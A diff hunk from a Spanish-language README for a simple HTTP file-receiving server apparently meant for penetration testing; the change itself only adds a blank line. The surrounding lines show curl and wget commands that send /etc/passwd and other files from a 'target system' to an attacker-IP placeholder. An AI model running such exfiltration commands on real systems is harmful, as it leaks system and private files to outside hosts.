@@ -3,6 +3,7 @@ Un servidor HTTP simple para recepción de archivos diseñado para actividades d
 
 ### - Exfiltrar archivos desde sistema objetivo
 bash# curl -X POST -F "file=@/etc/passwd" http://[IP-ATACANTE]:8000
+
 bash# wget --post-file=/path/to/file http://[IP-ATACANTE]:8000
 
 ### - Subir múltiples archivos
